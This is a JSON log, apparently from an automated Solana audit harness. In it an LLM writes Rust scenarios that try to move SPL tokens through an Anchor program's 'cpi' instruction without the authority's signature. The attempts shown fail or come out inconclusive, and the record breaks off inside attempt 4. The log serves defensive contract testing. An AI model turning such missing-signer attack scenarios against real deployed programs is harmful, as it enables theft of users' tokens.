@@ -1,0 +1,573 @@
+{
+  "category": "SIGNER",
+  "verdict": "inconclusive",
+  "exploit_successful": false,
+  "attack_result": "UnknownError(PrivilegeEscalation)",
+  "reason": "o baseline 'transferencia legitima com authority assinando' falhou com Failure(InvalidAccountData); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)",
+  "attempts_used": 5,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2309,
+        "completion_tokens": 708,
+        "latency_s": 4.27
+      },
+      "raw": "{\n  \"plan\": \"O cenario monta contas SPL Token reais (mint, source, destination) e uma authority que nao assina. O baseline executa a instrucao `cpi` com a authority assinando, provando que o cenario esta correto. O ataque repete a mesma chamada removendo a assinatura da authority. O efeito mede se os tokens foram movidos de source para destination sem a assinatura da autoridade.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet source = Pubkey::new_unique();\\nlet destination = Pubkey::new_unique();\\nlet mint = Pubkey::new_unique();\\n\\nlet token_program_id = spl_token::id();\\n\\nlet source_data = anchor_account_data(\\\"Account\\\", &(mint, authority, 1000u64, 0u8, 0u8));\\nlet dest_data = anchor_account_data(\\\"Account\\\", &(mint, authority, 0u64, 0u8, 0u8));\\n\\nlet source_acc = account(&token_program_id, &source_data, None);\\nlet dest_acc = account(&token_program_id, &dest_data, None);\\nlet authority_acc = wallet(1_000_000_000);\\n\\nlet contas = vec![\\n    (source, source_acc.clone()),\\n    (destination, dest_acc.clone()),\\n    (authority, authority_acc.clone()),\\n    (token_program_id, program_account(&token_program_id)),\\n];\\n\\nlet metas = vec![\\n    AccountMeta::new(source, false),\\n    AccountMeta::new(destination, false),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new_readonly(token_program_id, false),\\n];\\n\\nlet ix = env.anchor_ix(\\\"cpi\\\", &(100u64,), metas);\\nlet baseline = env.baseline(\\\"transferencia legitima com authority assinando\\\", &ix, &contas);\\n\\nlet metas_ataque = vec![\\n    AccountMeta::new(source, false),\\n    AccountMeta::new(destination, false),\\n    AccountMeta::new_readonly(authority, false),\\n    AccountMeta::new_readonly(token_program_id, false),\\n];\\n\\nlet ix_ataque = env.anchor_ix(\\\"cpi\\\", &(100u64,), metas_ataque);\\nlet r = env.attack(\\\"transferencia sem assinatura da authority\\\", &ix_ataque, &contas);\\n\\nif r.program_result == ProgramResult::Success {\\n    let dest_after = after(&r, &destination);\\n    let source_after = after(&r, &source);\\n    let dest_amount = read_u64(dest_after.data(), 64);\\n    let source_amount = read_u64(source_after.data(), 64);\\n    env.effect(\\\"tokens movidos sem assinatura da authority\\\", dest_amount == 100 && source_amount == 900);\\n}\"\n}",
+      "plan": "O cenario monta contas SPL Token reais (mint, source, destination) e uma authority que nao assina. O baseline executa a instrucao `cpi` com a authority assinando, provando que o cenario esta correto. O ataque repete a mesma chamada removendo a assinatura da authority. O efeito mede se os tokens foram movidos de source para destination sem a assinatura da autoridade.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet source = Pubkey::new_unique();\nlet destination = Pubkey::new_unique();\nlet mint = Pubkey::new_unique();\n\nlet token_program_id = spl_token::id();\n\nlet source_data = anchor_account_data(\"Account\", &(mint, authority, 1000u64, 0u8, 0u8));\nlet dest_data = anchor_account_data(\"Account\", &(mint, authority, 0u64, 0u8, 0u8));\n\nlet source_acc = account(&token_program_id, &source_data, None);\nlet dest_acc = account(&token_program_id, &dest_data, None);\nlet authority_acc = wallet(1_000_000_000);\n\nlet contas = vec![\n    (source, source_acc.clone()),\n    (destination, dest_acc.clone()),\n    (authority, authority_acc.clone()),\n    (token_program_id, program_account(&token_program_id)),\n];\n\nlet metas = vec![\n    AccountMeta::new(source, false),\n    AccountMeta::new(destination, false),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new_readonly(token_program_id, false),\n];\n\nlet ix = env.anchor_ix(\"cpi\", &(100u64,), metas);\nlet baseline = env.baseline(\"transferencia legitima com authority assinando\", &ix, &contas);\n\nlet metas_ataque = vec![\n    AccountMeta::new(source, false),\n    AccountMeta::new(destination, false),\n    AccountMeta::new_readonly(authority, false),\n    AccountMeta::new_readonly(token_program_id, false),\n];\n\nlet ix_ataque = env.anchor_ix(\"cpi\", &(100u64,), metas_ataque);\nlet r = env.attack(\"transferencia sem assinatura da authority\", &ix_ataque, &contas);\n\nif r.program_result == ProgramResult::Success {\n    let dest_after = after(&r, &destination);\n    let source_after = after(&r, &source);\n    let dest_amount = read_u64(dest_after.data(), 64);\n    let source_amount = read_u64(source_after.data(), 64);\n    env.effect(\"tokens movidos sem assinatura da authority\", dest_amount == 100 && source_amount == 900);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0433]: cannot find module or crate `spl_token` in this scope\n  --> tests/attempt.rs:14:28\n   |\n14 |     let token_program_id = spl_token::id();\n   |                            ^^^^^^^^^ use of unresolved module or unlinked crate `spl_token`\n   |\n   = help: if you wanted to use a crate named `spl_token`, use `cargo add spl_token` to add it to your `Cargo.toml`\n\nFor more information about this error, try `rustc --explain E0433`.\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 1 previous error",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0433]: cannot find module or crate `spl_token` in this scope\n  --> tests/attempt.rs:14:28\n   |\n14 |     let token_program_id = spl_token::id();\n   |                            ^^^^^^^^^ use of unresolved module or unlinked crate `spl_token`\n   |\n   = help: if you wanted to use a crate named `spl_token`, use `cargo add spl_token` to add it to your `Cargo.toml`\n\nFor more information about this error, try `rustc --explain E0433`.\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 1 previous error"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3027,
+        "completion_tokens": 704,
+        "latency_s": 4.01
+      },
+      "raw": "{\"plan\": \"Preparar contas SPL Token (source, destination, authority) com o layout correto e o token program real. Executar um baseline legitimo onde a authority assina, provando que o cenario esta montado. Atacar removendo a assinatura da authority (mesma instrucao, apenas sem signer). Medir se os tokens foram movidos de source para destination sem a assinatura da authority.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet source = Pubkey::new_unique();\\nlet destination = Pubkey::new_unique();\\nlet mint = Pubkey::new_unique();\\n\\nlet token_program_id = Pubkey::new_from_array([6u8; 32]);\\n\\nlet source_data = anchor_account_data(\\\"Account\\\", &(mint, authority, 1000u64, 0u8, 0u8));\\nlet dest_data = anchor_account_data(\\\"Account\\\", &(mint, authority, 0u64, 0u8, 0u8));\\n\\nlet source_acc = account(&token_program_id, &source_data, None);\\nlet dest_acc = account(&token_program_id, &dest_data, None);\\nlet authority_acc = wallet(1_000_000_000);\\n\\nlet contas = vec![\\n    (source, source_acc.clone()),\\n    (destination, dest_acc.clone()),\\n    (authority, authority_acc.clone()),\\n    (token_program_id, program_account(&token_program_id)),\\n];\\n\\nlet metas = vec![\\n    AccountMeta::new(source, false),\\n    AccountMeta::new(destination, false),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new_readonly(token_program_id, false),\\n];\\n\\nlet ix = env.anchor_ix(\\\"cpi\\\", &(100u64,), metas);\\nlet baseline = env.baseline(\\\"transferencia legitima com authority assinando\\\", &ix, &contas);\\n\\nlet metas_ataque = vec![\\n    AccountMeta::new(source, false),\\n    AccountMeta::new(destination, false),\\n    AccountMeta::new_readonly(authority, false),\\n    AccountMeta::new_readonly(token_program_id, false),\\n];\\n\\nlet ix_ataque = env.anchor_ix(\\\"cpi\\\", &(100u64,), metas_ataque);\\nlet r = env.attack(\\\"transferencia sem assinatura da authority\\\", &ix_ataque, &contas);\\n\\nif r.program_result == ProgramResult::Success {\\n    let dest_after = after(&r, &destination);\\n    let source_after = after(&r, &source);\\n    let dest_amount = read_u64(dest_after.data(), 64);\\n    let source_amount = read_u64(source_after.data(), 64);\\n    env.effect(\\\"tokens movidos sem assinatura da authority\\\", dest_amount == 100 && source_amount == 900);\\n}\"}",
+      "plan": "Preparar contas SPL Token (source, destination, authority) com o layout correto e o token program real. Executar um baseline legitimo onde a authority assina, provando que o cenario esta montado. Atacar removendo a assinatura da authority (mesma instrucao, apenas sem signer). Medir se os tokens foram movidos de source para destination sem a assinatura da authority.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet source = Pubkey::new_unique();\nlet destination = Pubkey::new_unique();\nlet mint = Pubkey::new_unique();\n\nlet token_program_id = Pubkey::new_from_array([6u8; 32]);\n\nlet source_data = anchor_account_data(\"Account\", &(mint, authority, 1000u64, 0u8, 0u8));\nlet dest_data = anchor_account_data(\"Account\", &(mint, authority, 0u64, 0u8, 0u8));\n\nlet source_acc = account(&token_program_id, &source_data, None);\nlet dest_acc = account(&token_program_id, &dest_data, None);\nlet authority_acc = wallet(1_000_000_000);\n\nlet contas = vec![\n    (source, source_acc.clone()),\n    (destination, dest_acc.clone()),\n    (authority, authority_acc.clone()),\n    (token_program_id, program_account(&token_program_id)),\n];\n\nlet metas = vec![\n    AccountMeta::new(source, false),\n    AccountMeta::new(destination, false),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new_readonly(token_program_id, false),\n];\n\nlet ix = env.anchor_ix(\"cpi\", &(100u64,), metas);\nlet baseline = env.baseline(\"transferencia legitima com authority assinando\", &ix, &contas);\n\nlet metas_ataque = vec![\n    AccountMeta::new(source, false),\n    AccountMeta::new(destination, false),\n    AccountMeta::new_readonly(authority, false),\n    AccountMeta::new_readonly(token_program_id, false),\n];\n\nlet ix_ataque = env.anchor_ix(\"cpi\", &(100u64,), metas_ataque);\nlet r = env.attack(\"transferencia sem assinatura da authority\", &ix_ataque, &contas);\n\nif r.program_result == ProgramResult::Success {\n    let dest_after = after(&r, &destination);\n    let source_after = after(&r, &source);\n    let dest_amount = read_u64(dest_after.data(), 64);\n    let source_amount = read_u64(source_after.data(), 64);\n    env.effect(\"tokens movidos sem assinatura da authority\", dest_amount == 100 && source_amount == 900);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "transferencia legitima com authority assinando",
+            "result": "Failure(IncorrectProgramId)",
+            "compute_units": 2873,
+            "account_flags": "-w,-w,sr,-r",
+            "ix_head": "4cad065fb55d53ce",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "QWmroo4YnnMqYW3cnxWkFdaTxGD3P7vMSzwMHGbUzwF",
+                "data_len": 82,
+                "head": "7142e036bc77f065",
+                "digest": "bb5dff2e032bc386",
+                "post": "7142e036bc77f06500000000000000050000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000e8030000000000000000"
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "QWmroo4YnnMqYW3cnxWkFdaTxGD3P7vMSzwMHGbUzwF",
+                "data_len": 82,
+                "head": "7142e036bc77f065",
+                "digest": "8ffde4f8ddf7f81d",
+                "post": "7142e036bc77f0650000000000000005000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "QWmroo4YnnMqYW3cnxWkFdaTxGD3P7vMSzwMHGbUzwF",
+                "signer": false,
+                "writable": false,
+                "owner": "BPFLoaderUpgradeab1e11111111111111111111111",
+                "data_len": 36,
+                "head": "0200000058b1ad6d",
+                "digest": "537f8875868a0a37",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "transferencia sem assinatura da authority",
+            "result": "Failure(IncorrectProgramId)",
+            "compute_units": 2874,
+            "account_flags": "-w,-w,-r,-r",
+            "ix_head": "4cad065fb55d53ce",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "QWmroo4YnnMqYW3cnxWkFdaTxGD3P7vMSzwMHGbUzwF",
+                "data_len": 82,
+                "head": "7142e036bc77f065",
+                "digest": "bb5dff2e032bc386",
+                "post": "7142e036bc77f06500000000000000050000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000e8030000000000000000"
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "QWmroo4YnnMqYW3cnxWkFdaTxGD3P7vMSzwMHGbUzwF",
+                "data_len": 82,
+                "head": "7142e036bc77f065",
+                "digest": "8ffde4f8ddf7f81d",
+                "post": "7142e036bc77f0650000000000000005000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "QWmroo4YnnMqYW3cnxWkFdaTxGD3P7vMSzwMHGbUzwF",
+                "signer": false,
+                "writable": false,
+                "owner": "BPFLoaderUpgradeab1e11111111111111111111111",
+                "data_len": 36,
+                "head": "0200000058b1ad6d",
+                "digest": "537f8875868a0a37",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 2873 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: incorrect program id for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 2874 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: incorrect program id for instruction"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o baseline 'transferencia legitima com authority assinando' falhou com Failure(IncorrectProgramId); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    },
+    {
+      "attempt": 3,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2937,
+        "completion_tokens": 886,
+        "latency_s": 5.18
+      },
+      "raw": "{\n  \"plan\": \"O baseline falhou com IncorrectProgramId porque o token_program passado nao era o SPL Token real. O programa-alvo apenas faz CPI para o token_program fornecido, entao o cenario deve usar o SPL Token program id real (TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA) e contas de token com layout SPL Token (mint, owner, amount em offsets 0,32,64). O baseline executa uma transferencia legitima com a authority assinando; o ataque repete a mesma transferencia sem a assinatura da authority. O efeito mede que os tokens foram movidos (destination recebeu 100 e source ficou com 900) mesmo sem a assinatura da authority.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet source = Pubkey::new_unique();\\nlet destination = Pubkey::new_unique();\\nlet mint = Pubkey::new_unique();\\n\\nlet token_program_id = Pubkey::new_from_array([\\n    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70, 206, 235, 121, 172,\\n    28, 180, 133, 237, 95, 91, 55, 145, 58, 140, 245, 133, 126, 255, 0, 169,\\n]);\\n\\nlet source_data = anchor_account_data(\\\"Account\\\", &(mint, authority, 1000u64, 0u8, 0u8));\\nlet dest_data = anchor_account_data(\\\"Account\\\", &(mint, authority, 0u64, 0u8, 0u8));\\n\\nlet source_acc = account(&token_program_id, &source_data, None);\\nlet dest_acc = account(&token_program_id, &dest_data, None);\\nlet authority_acc = wallet(1_000_000_000);\\n\\nlet contas = vec![\\n    (source, source_acc.clone()),\\n    (destination, dest_acc.clone()),\\n    (authority, authority_acc.clone()),\\n    (token_program_id, program_account(&token_program_id)),\\n];\\n\\nlet metas = vec![\\n    AccountMeta::new(source, false),\\n    AccountMeta::new(destination, false),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new_readonly(token_program_id, false),\\n];\\n\\nlet ix = env.anchor_ix(\\\"cpi\\\", &(100u64,), metas);\\nlet baseline = env.baseline(\\\"transferencia legitima com authority assinando\\\", &ix, &contas);\\n\\nlet metas_ataque = vec![\\n    AccountMeta::new(source, false),\\n    AccountMeta::new(destination, false),\\n    AccountMeta::new_readonly(authority, false),\\n    AccountMeta::new_readonly(token_program_id, false),\\n];\\n\\nlet ix_ataque = env.anchor_ix(\\\"cpi\\\", &(100u64,), metas_ataque);\\nlet r = env.attack(\\\"transferencia sem assinatura da authority\\\", &ix_ataque, &contas);\\n\\nif r.program_result == ProgramResult::Success {\\n    let dest_after = after(&r, &destination);\\n    let source_after = after(&r, &source);\\n    let dest_amount = read_u64(dest_after.data(), 64);\\n    let source_amount = read_u64(source_after.data(), 64);\\n    env.effect(\\\"tokens movidos sem assinatura da authority\\\", dest_amount == 100 && source_amount == 900);\\n}\"\n}",
+      "plan": "O baseline falhou com IncorrectProgramId porque o token_program passado nao era o SPL Token real. O programa-alvo apenas faz CPI para o token_program fornecido, entao o cenario deve usar o SPL Token program id real (TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA) e contas de token com layout SPL Token (mint, owner, amount em offsets 0,32,64). O baseline executa uma transferencia legitima com a authority assinando; o ataque repete a mesma transferencia sem a assinatura da authority. O efeito mede que os tokens foram movidos (destination recebeu 100 e source ficou com 900) mesmo sem a assinatura da authority.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet source = Pubkey::new_unique();\nlet destination = Pubkey::new_unique();\nlet mint = Pubkey::new_unique();\n\nlet token_program_id = Pubkey::new_from_array([\n    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70, 206, 235, 121, 172,\n    28, 180, 133, 237, 95, 91, 55, 145, 58, 140, 245, 133, 126, 255, 0, 169,\n]);\n\nlet source_data = anchor_account_data(\"Account\", &(mint, authority, 1000u64, 0u8, 0u8));\nlet dest_data = anchor_account_data(\"Account\", &(mint, authority, 0u64, 0u8, 0u8));\n\nlet source_acc = account(&token_program_id, &source_data, None);\nlet dest_acc = account(&token_program_id, &dest_data, None);\nlet authority_acc = wallet(1_000_000_000);\n\nlet contas = vec![\n    (source, source_acc.clone()),\n    (destination, dest_acc.clone()),\n    (authority, authority_acc.clone()),\n    (token_program_id, program_account(&token_program_id)),\n];\n\nlet metas = vec![\n    AccountMeta::new(source, false),\n    AccountMeta::new(destination, false),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new_readonly(token_program_id, false),\n];\n\nlet ix = env.anchor_ix(\"cpi\", &(100u64,), metas);\nlet baseline = env.baseline(\"transferencia legitima com authority assinando\", &ix, &contas);\n\nlet metas_ataque = vec![\n    AccountMeta::new(source, false),\n    AccountMeta::new(destination, false),\n    AccountMeta::new_readonly(authority, false),\n    AccountMeta::new_readonly(token_program_id, false),\n];\n\nlet ix_ataque = env.anchor_ix(\"cpi\", &(100u64,), metas_ataque);\nlet r = env.attack(\"transferencia sem assinatura da authority\", &ix_ataque, &contas);\n\nif r.program_result == ProgramResult::Success {\n    let dest_after = after(&r, &destination);\n    let source_after = after(&r, &source);\n    let dest_amount = read_u64(dest_after.data(), 64);\n    let source_amount = read_u64(source_after.data(), 64);\n    env.effect(\"tokens movidos sem assinatura da authority\", dest_amount == 100 && source_amount == 900);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "transferencia legitima com authority assinando",
+            "result": "Failure(InvalidAccountData)",
+            "compute_units": 3407,
+            "account_flags": "-w,-w,sr,-r",
+            "ix_head": "4cad065fb55d53ce",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 82,
+                "head": "7142e036bc77f065",
+                "digest": "bb5dff2e032bc386",
+                "post": "7142e036bc77f06500000000000000050000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000e8030000000000000000"
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 82,
+                "head": "7142e036bc77f065",
+                "digest": "8ffde4f8ddf7f81d",
+                "post": "7142e036bc77f0650000000000000005000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "signer": false,
+                "writable": false,
+                "owner": "BPFLoaderUpgradeab1e11111111111111111111111",
+                "data_len": 36,
+                "head": "0200000027f190b1",
+                "digest": "5b31219b7bc4060b",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "transferencia sem assinatura da authority",
+            "result": "UnknownError(PrivilegeEscalation)",
+            "compute_units": 3408,
+            "account_flags": "-w,-w,-r,-r",
+            "ix_head": "4cad065fb55d53ce",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 82,
+                "head": "7142e036bc77f065",
+                "digest": "bb5dff2e032bc386",
+                "post": "7142e036bc77f06500000000000000050000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000e8030000000000000000"
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 82,
+                "head": "7142e036bc77f065",
+                "digest": "8ffde4f8ddf7f81d",
+                "post": "7142e036bc77f0650000000000000005000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "signer": false,
+                "writable": false,
+                "owner": "BPFLoaderUpgradeab1e11111111111111111111111",
+                "data_len": 36,
+                "head": "0200000027f190b1",
+                "digest": "5b31219b7bc4060b",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA invoke [2]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA failed: invalid account data for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3407 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: invalid account data for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3408 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: Cross-program invocation with unauthorized signer or writable account"
+        ],
+        "elapsed_s": 1.7
+      },
+      "verdict": null,
+      "reason": "o baseline 'transferencia legitima com authority assinando' falhou com Failure(InvalidAccountData); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    },
+    {
+      "attempt": 4,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3027,
+        "completion_tokens": 1071,
+        "latency_s": 4.83
+      },
+      "raw": "{\"plan\": \"O baseline falhou com InvalidAccountData porque os dados das contas SPL Token foram montados com anchor_account_data (discriminador Anchor + campos), mas contas do SPL Token nao tem discriminador Anchor. Vou montar os dados no layout nativo do SPL Token (mint 32 bytes, owner 32 bytes, amount u64 LE, delegate COption<Pubkey> 36 bytes, state u8, is_native COption<u64> 12 bytes, delegated_amount u64, close_authority COption<Pubkey> 36 bytes). O baseline sera uma transferencia legitima com a authority assinando; o ataque repete a mesma transferencia sem a assinatura da authority, e o efeito mede que os saldos mudaram (tokens movidos) sem a assinatura.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet source = Pubkey::new_unique();\\nlet destination = Pubkey::new_unique();\\nlet mint = Pubkey::new_unique();\\n\\nlet token_program_id = Pubkey::new_from_array([\\n    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70, 206, 235, 121, 172,\\n    28, 180, 133, 237, 95, 91, 55, 145, 58, 140, 245, 133, 126, 255, 0, 169,\\n]);\\n\\nfn token_account_data(mint: &Pubkey, owner: &Pubkey, amount: u64) -> Vec<u8> {\\n    let mut d = Vec::with_capacity(165);\\n    d.extend_from_slice(mint.as_ref());\\n    d.extend_from_slice(owner.as_ref());\\n    d.extend_from_slice(&amount.to_le_bytes());\\n    d.extend_from_slice(&[0u8; 36]); // delegate: COption<Pubkey> = None\\n    d.push(1u8); // state: Initialized\\n    d.extend_from_slice(&[0u8; 12]); // is_native: COption<u64> = None\\n    d.extend_from_slice(&0u64.to_le_bytes()); // delegated_amount\\n    d.extend_from_slice(&[0u8; 36]); // close_authority: COption<Pubkey> = None\\n    d\\n}\\n\\nlet source_data = token_account_data(&mint, &authority, 1000u64);\\nlet dest_data = token_account_data(&mint, &authority, 0u64);\\n\\nlet source_acc = account(&token_program_id, &source_data, None);\\nlet dest_acc = account(&token_program_id, &dest_data, None);\\nlet authority_acc = wallet(1_000_000_000);\\n\\nlet contas = vec![\\n    (source, source_acc.clone()),\\n    (destination, dest_acc.clone()),\\n    (authority, authority_acc.clone()),\\n    (token_program_id, program_account(&token_program_id)),\\n];\\n\\nlet metas = vec![\\n    AccountMeta::new(source, false),\\n    AccountMeta::new(destination, false),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new_readonly(token_program_id, false),\\n];\\n\\nlet ix = env.anchor_ix(\\\"cpi\\\", &(100u64,), metas);\\nlet baseline = env.baseline(\\\"transferencia legitima com authority assinando\\\", &ix, &contas);\\n\\nlet metas_ataque = vec![\\n    AccountMeta::new(source, false),\\n    AccountMeta::new(destination, false),\\n    AccountMeta::new_readonly(authority, false),\\n    AccountMeta::new_readonly(token_program_id, false),\\n];\\n\\nlet ix_ataque = env.anchor_ix(\\\"cpi\\\", &(100u64,), metas_ataque);\\nlet r = env.attack(\\\"transferencia sem assinatura da authority\\\", &ix_ataque, &contas);\\n\\nif r.program_result == ProgramResult::Success {\\n    let dest_after = after(&r, &destination);\\n    let source_after = after(&r, &source);\\n    let dest_amount = read_u64(dest_after.data(), 64);\\n    let source_amount = read_u64(source_after.data(), 64);\\n    env.effect(\\\"tokens movidos sem assinatura da authority\\\", dest_amount == 100 && source_amount == 900);\\n}\"}",
+      "plan": "O baseline falhou com InvalidAccountData porque os dados das contas SPL Token foram montados com anchor_account_data (discriminador Anchor + campos), mas contas do SPL Token nao tem discriminador Anchor. Vou montar os dados no layout nativo do SPL Token (mint 32 bytes, owner 32 bytes, amount u64 LE, delegate COption<Pubkey> 36 bytes, state u8, is_native COption<u64> 12 bytes, delegated_amount u64, close_authority COption<Pubkey> 36 bytes). O baseline sera uma transferencia legitima com a authority assinando; o ataque repete a mesma transferencia sem a assinatura da authority, e o efeito mede que os saldos mudaram (tokens movidos) sem a assinatura.",
